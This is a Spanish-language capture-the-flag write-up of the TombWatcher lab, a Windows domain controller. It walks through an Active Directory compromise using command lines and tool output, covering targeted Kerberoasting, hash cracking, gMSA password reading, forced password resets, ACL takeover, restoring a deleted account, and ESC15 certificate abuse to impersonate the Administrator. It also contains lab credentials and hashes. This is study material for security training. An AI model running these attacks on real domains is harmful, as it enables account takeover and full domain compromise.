
# TombWatcher

<figure><img src="/files/j046Xz5ihKf2FPsqDaPx" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `TombWatcher`
* **IP:** `10.10.11.72`
* **Sistema operativo:** `Windows`
* **Dificultad:** `🟡 Media`
* **Fecha:** `03/07/2025`

***

## <mark style="color:purple;">Configuración del host</mark>

La plataforma nos proporciona las credenciales iniciales para esta máquina:

```
henry / H3nry_987TGV!
```

#### /etc/passwd

Añadimos la IP a nuestro `/etc/hosts` y accedemos través del navegador.

```bash
sudo echo "10.10.11.72 tombwatcher.htb" | sudo tee -a /etc/hosts
```

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -sV -T5 10.10.11.72
```

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-09 20:04:30Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Encontramos multitud de puertos abiertos, lo normal en máquinas Windows. Ademas nos encontramos con que la máquina objetivo es un Domain Controller, por la presencia de los puertos 3268 o 389, reservados para DCs.

Destacan los puertos:

* `111 (RPC)` - Puede contener recursos compartidos o enumerar usuarios
* `445 (SMB)` - Recursos compartidos y enumeración
* `5985 (WinRM)` - Acceso con EvilWinRM con contraseña
* `88 (Kerberos)` - Posible Kerberoasting o AS-REP Roasting

***

## <mark style="color:purple;">Enumeración inicial</mark>

Con `enum4linux-ng` conseguimos obtener un listado de todos los usuarios del sistema y encontramos 5 shares:

```bash
enum4linux-ng tombwatcher.htb -u henry -p 'H3nry_987TGV!'

 ========================================
|    Users via RPC on tombwatcher.htb    |
 ========================================
[*] Enumerating users via 'querydispinfo'
[+] Found 8 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 8 user(s) via 'enumdomusers'
[+] After merging user results we have 8 user(s) total:
'1103':
  username: Henry
  name: (null)
  acb: '0x00000210'
  description: (null)
'1104':
  username: Alfred
  name: (null)
  acb: '0x00000210'
  description: (null)
'1105':
  username: sam
  name: (null)
  acb: '0x00000210'
  description: (null)
'1106':
  username: john
  name: (null)
  acb: '0x00000210'
  description: (null)
'1111':
  username: cert_admin
  name: (null)
  acb: '0x00000210'
  description: (null)
'500':
  username: Administrator
  name: (null)
  acb: '0x00000210'
  description: Built-in account for administering the computer/domain
'501':
  username: Guest
  name: (null)
  acb: '0x00000215'
  description: Built-in account for guest access to the computer/domain
'502':
  username: krbtgt
  name: (null)
  acb: '0x00000011'
  description: Key Distribution Center Service Account
  
 =========================================
|    Shares via RPC on tombwatcher.htb    |
 =========================================
[*] Enumerating shares
[+] Found 5 share(s):
ADMIN$:
  comment: Remote Admin
  type: Disk
C$:
  comment: Default share
  type: Disk
IPC$:
  comment: Remote IPC
  type: IPC
NETLOGON:
  comment: Logon server share
  type: Disk
SYSVOL:
  comment: Logon server share
  type: Disk
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
```

***

## <mark style="color:purple;">Enumeración de Active Directory</mark>

### Enumeración de usuarios/grupos

De igual manera confirmamos los usuarios encontrados con crackmapexec:

```bash
crackmapexec smb tombwatcher.htb -u henry -p 'H3nry_987TGV!' --users

SMB         tombwatcher.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         tombwatcher.htb 445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         tombwatcher.htb 445    DC01             [+] Enumerated domain user(s)
SMB         tombwatcher.htb 445    DC01             tombwatcher.htb\cert_admin                     badpwdcount: 0 desc: 
SMB         tombwatcher.htb 445    DC01             tombwatcher.htb\john                           badpwdcount: 0 desc: 
SMB         tombwatcher.htb 445    DC01             tombwatcher.htb\sam                            badpwdcount: 0 desc: 
SMB         tombwatcher.htb 445    DC01             tombwatcher.htb\Alfred                         badpwdcount: 0 desc: 
SMB         tombwatcher.htb 445    DC01             tombwatcher.htb\Henry                          badpwdcount: 0 desc: 
SMB         tombwatcher.htb 445    DC01             tombwatcher.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         tombwatcher.htb 445    DC01             tombwatcher.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         tombwatcher.htb 445    DC01             tombwatcher.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
```

Añadimos los usuarios encontramos a un archivo `valid-users.txt`. Probar a volcar tickets Kerberos mediante `ASREP-Roasting` falla:

```bash
impacket-GetNPUsers tombwatcher.htb/ -usersfile valid_users.txt -dc-ip 10.10.11.72

Impacket v0.13.0.dev0+20250523.184829.f2f2b367 - Copyright Fortra, LLC and its affiliated companies 

[-] User cert_admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User john doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sam doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Alfred doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Henry doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

### Shares - Recursos compartidos

```bash
smbmap -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb -H 10.10.11.72

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.11.72:445	Name: tombwatcher.htb     	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
[*] Closed 1 connections  
```

No encontramos ningún share interesante.

***

## <mark style="color:purple;">Enumeración con Bloodhound</mark>

### Editar resolv.conf

```bash
sudo gedit /etc/resolv.conf

domain tombwatcher.htb
nameserver 10.10.11.72
search tombwatcher.htb
```

### Bloodhound Python

```bash
bloodhound-python -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb -c all --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 11S
INFO: Compressing output into 20250609182650_bloodhound.zip
```

### Análisis con Bloodhound

Nuestro usuario `Henry` tiene permisos `WriteSPN` sobre el usuario `Alfred`:

<figure><img src="/files/73FODAWLLE5IYOx4kpTN" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Ruta de explotación</mark>

### 1. Kerberoasting dirigido

Para explotar el permiso `WriteSPN` usaremos la herramienta targeterKerberoast:

{% embed url="<https://github.com/ShutdownRepo/targetedKerberoast>" %}

Antes de ejecutarlo debemos sincronizar la hora de nuestro Kali con el Domain Controller, ya que sino rechazará el TGT:

```bash
sudo ntpdate tombwatcher.htb

2025-06-19 13:20:34.636723 (+0200) +14392.776522 +/- 0.024673 tombwatcher.htb 10.10.11.72 s1 no-leap
CLOCK: time stepped by 14392.776522
```

Ahora si, lo ejecutamos de la siguiente manera

{% code overflow="wrap" %}

```bash
python targetedKerberoast.py -v -d tombwatcher.htb -u henry -p 'H3nry_987TGV!'

[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$a32c207697a9cdfb13a204276f3e66ae$c7223b49d82ed077bedf004f92a4397e41fcc92fd240ed30f30672dacbc5f2ad46547fe731ed679a8503f504cf09c574edf4135d6550f528ca6bb8273905b1caa6332324fe7f3ace863d86921b76c2b1f77f9e42072dc368a76305ca6477f2249892521a5ab9528bc889676431cf401b56c2d7173423d83106c568c0b8d6c3691f21f4d6376c416759fab589d5042546ca695ea5c5a3166f95f95a932d45704000e2ca0d734256a7d551bd7d2d849106ecca03b7788048eed0f99a14bd6925ac77be7287a6bf0a73933865d5ce326dacd18e80dc5eb1debda9161e64cafe936e1bc243f9db5e2d5b11e0e69d47eeaa83f28a7ec0989ec6ba1ac5b08acfee758d34d89c59e4c08d8f50fbdaae74d2616e1fb608f79780f6eae9c2dc28e657f36559fe7c9dda50cfdbb8590ce9630c2abb20583e9fa0b38c8507877ff9fcc717ba31096aa7998a0b1451bc4540656c88e2100eace67d02005e717c08f2fbc605f5c15e8f0d106c5b27413e08831ed7e0f8b471eecea3eb65636aac09fbd5eeac196c57f8ea40d57277cca582541e0c39d83a95178650cfa5a131c8ec889a442bca61e8f2a99cef834868d345fdceafdd93b8b6545b4fc8be060566d2e488210ebc3e21ff5d03a5416b97c67d2fc923b34bc069b0f04c834a401c7f925ff776242055a3614941bf4198c4934c36d9519b1f8a46a5ee35b987b4c8ca4a04cd870802b154f16c742591e905f47ab2eb0ce6c33bcacbdcf3e443452d345b37bb113bd66ccfcb339334de41d2fbf6caa723e554f6905fd8761fb70a4080f46f3ee4be078f1659655d0aeb6666d5c2091666d22b9af4155ba84667d3bf342521ddd78b9a6a0d3add259641eb170a44a5d17dfd397c76b5a4ded5a5b1d38f9c2eab95f39a65ae9e6fa56bdc23fb1547481007e73fda1ef2c15257e6a5a2503b1b0effb3790d4c035f690e8210bd9434238e158ee2b65725cd4fc38546496c5858792fe265b9c271e97be16d6c23d44c38f38352a33e6de7e2b949be8c4c4f2a60b7006e5298f4d2ff23c8a9f050b9dd110163de3b7d58c4e90ceb06c2551b59d0e984f1dfa622f595dd64ca37b947bb6f8cc73ecf454197610bb0d93f9fb0130e3b1a7500a969045a100ef7e3f934441059990b550bf424bc401d7ab80dc11379b67dac6f3a0dd492950dfd8b81b97be717d140b3fe56a08500898ac2c2380efa2b94ba6cbb65730497338d2c8ea1c70dbc82a4a9712e5e37ece0cc889eb6127c42679a35ecff56df2779ca009179103e03dae0dc8b2c5f021440946d63272bbfde60a84eacb45e447769814209b1e93de6d9a6bd4d31de6767e3efba6a6c73b9e1a4785e3b5ac20676a4d14146374871a3940f0d2c5e3205423b8455728cd3835b088c87528663255a3a2bb81ca3e2258b9d89c3ed76d11fa3effe8c0d46d40553c1cdcd8563207539ef5eb7fae0ee245840aee413358c176d
[VERBOSE] SPN removed successfully for (Alfred)
```

{% endcode %}

Obtenemos el hash de Alfred, que crackearemos con John the Ripper o Hashcat:

```q
john alfred_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
                
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

basketball       (?)
```

Tenemos la contraseña de Alfred: `basketball`

### 2. BloodHound como Alfred

Usaremos estas nuevas credenciales para volver a enumerar el entorno con BloodHound.

```bash
bloodhound-python -u alfred -p 'basketball' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip  

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 10 users
INFO: Found 53 groups
<---SNIP--->
```

`Alfred` tiene permisos `AddSelf` y es miembro del grupo `Infraestructure`, que tiene permisos `ReadGMSAPassword` sobre el equipo `ANSIBLE_DEV$`:

<figure><img src="/files/q9J5nCLysD6nzeqDce0F" alt=""><figcaption></figcaption></figure>

### 3. Añadir a Alfred a Infraestructure

Para ello usaremos `BloodyAD` de la siguiente manera:

```bash
bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u alfred -p 'basketball' add groupMember INFRASTRUCTURE alfred

[+] alfred added to INFRASTRUCTURE
```

### 4. ReadGMSAPassword

Una vez que nos hemos añadido al grupo `infraestructure`, usaremos la herramienta `GMSAdumpster` para leer la contraseña o hash de `ansible_dev$`:

{% embed url="<https://github.com/micahvandeusen/gMSADumper>" %}

```bash
python gMSADumper.py -u alfred -p basketball -d tombwatcher.htb

Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::4b21348ca4a9edff9689cdf75cbda439
ansible_dev$:aes256-cts-hmac-sha1-96:499620251908efbd6972fd63ba7e385eb4ea2f0ea5127f0ab4ae3fd7811e600a
ansible_dev$:aes128-cts-hmac-sha1-96:230ccd9df374b5fad6a322c5d7410226
```

Intentamos crackear los hashes pero no tenemos éxito, por lo que enumeraremos otra vez el sistema con BloodHound pasándole el hash.

### 5. Bloodhound 3

```bash
bloodhound-python -u 'ansible_dev$'  --hashes ':4b21348ca4a9edff9689cdf75cbda439' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 13S
INFO: Compressing output into 20250608124415_bloodhound.zip
```

`ANSIBLE_DEV$` tiene permisos `ForceChangePassword` sobre el usuario `Sam`:

<figure><img src="/files/R9qjETESVIRD96R9DFH5" alt=""><figcaption></figcaption></figure>

### 6. Cambiar la contraseña de Sam

Usaremos BloodyAD para ello:

```bash
bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u 'ansible_dev$' -p ':4b21348ca4a9edff9689cdf75cbda439' set password SAM 'Abc123456@'

[+] Password changed successfully!
```

Ahora volvemos a enumerar el entorno con BloodHound y las nuevas credenciales de Sam:

```bash
bloodhound-python  -u 'SAM' -p 'Abc123456@' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip                                               

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 10 users
INFO: Found 53 groups
```

El usuario `Sam` tiene permisos `WriteOwner` sobre el usuario `John`

<figure><img src="/files/ur7usAFWM9SRlo5Yd0C4" alt=""><figcaption></figcaption></figure>

### 7. Tomar control de John

Usa **BloodyAD** para hacer *takeover* del usuario `John`:

```bash
bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u 'SAM' -p 'Abc123456@' set owner john SAM

[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by SAM on john
```

Usa `genericAll` para concederte control total:

```bash
bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u 'SAM' -p 'Abc123456@' add genericAll john SAM

[+] SAM has now GenericAll on john
```

Y cambiamos la contraseña de John:

```bash
bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u 'SAM' -p 'Abc123456@' set password JOHN 'P4ssword123!'

[+] Password changed successfully!
```

Una vez cambiada la contraseña nos conectamos por EvilWinRM y ganamos la user flag.

***

## <mark style="color:purple;">User Flag</mark>

```bash
evil-winrm -u JOHN -p 'P4ssword123!' -i 10.10.11.72                   
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> cd ..
*Evil-WinRM* PS C:\Users\john> cd Desktop
*Evil-WinRM* PS C:\Users\john\Desktop> ls

    Directory: C:\Users\john\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/19/2025   7:44 AM             34 user.txt


*Evil-WinRM* PS C:\Users\john\Desktop> cat user.txt
11f6762d2f6e5cd64b73fb91*************
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

Enumeraremos el entorno de nuevo con Bloodhound y las nuevas credenciales de John

```bash
bloodhound-python -u john -p 'P4ssword123!' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
<---SNIP--->
```

El usuario `John` tiene permisos `GenericAll` sobre la unidad organizativa `ACDS`:

<figure><img src="/files/Nig66yjNKDW62kxtrq4q" alt=""><figcaption></figcaption></figure>

El siguiente paso es hacerse cargo de sus objetos secundarios:

```bash
pip3 install impacket
```

```bash
impacket-dacledit -action write -rights FullControl -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=tombwatcher,DC=htb' tombwatcher.htb/john:'P4ssword123!'

Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250619-135858.bak
[*] DACL modified successfully!
```

### Cambiar la contraseña de cert\_admin

Al intentar cambiar la contraseña de cert\_admin vemos que el usuario ha sido eliminado:

```powershell
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 34509cb3-2b23-417b-8b98-13f0bd953319

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectClass       : user
ObjectGUID        : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectClass       : user
ObjectGUID        : c1f1f0fe-df9c-494c-bf05-0679e181b358

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:dad2c145-8ae7-4f7f-8f33-23474d90c74d,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:dad2c145-8ae7-4f7f-8f33-23474d90c74d
ObjectClass       : user
ObjectGUID        : dad2c145-8ae7-4f7f-8f33-23474d90c74d
```

Podemos restaurar el usuario y cambiar su contraseña con:

```powershell
+Evil-WinRM* PS C:\Users\john\Documents> Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
*Evil-WinRM* PS C:\Users\john\Documents> Enable-ADAccount -Identity cert_admin
*Evil-WinRM* PS C:\Users\john\Documents> Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "Abc123456@" -AsPlainText -Force)
```

### Certipy Find

```bash
certipy find -u cert_admin -p "Abc123456@" -dc-ip 10.10.11.72 -vulnerable

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250703144529_Certipy.txt'
[*] Wrote text output to '20250703144529_Certipy.txt'
[*] Saving JSON output to '20250703144529_Certipy.json'
[*] Wrote JSON output to '20250703144529_Certipy.json'
```

Ahora extraemos la información del archivo txt generado:

```
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

Al final del todo encontramos una vulnerabilidad relevante: `ESC15`

{% embed url="<https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu>" %}

### **Paso 1**

Solicitar un certificado, inyectando la política de aplicación “Autenticación de cliente” y el UPN de destino

```bash
certipy req \
    -u 'cert_admin@tombwatcher.htb' -p 'Abc123456@' \
    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -upn 'administrator@tombwatcher.htb'  \
    -application-policies 'Client Authentication'
```

### Paso 2

Autenticarse a través de Schannel (LDAPS) utilizando el certificado obtenido y cambiar la contraseña del administrador:

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72' -ldap-shell

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*] Connecting to 'ldaps://10.10.11.72:636'
[*] Authenticated to '10.10.11.72' as: 'u:TOMBWATCHER\\Administrator'
Type help for list of commands

# whoami
u:TOMBWATCHER\Administrator

# change_password administrator Abc123456@
Got User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb
Attempting to set new password of: Abc123456@
Password changed successfully!
```

***

## 👑 <mark style="color:purple;">Root Flag</mark>

Nos conectamos por EvilWinRM como administrator y obtenemos la root flag:

```bash
evil-winrm -u administrator -p ''Abc123456@ -i 10.10.11.72      
                                        
Evil-WinRM shell v3.7                                  
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         7/3/2025  12:22 PM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
9cddc8bf3055d459801193************
```
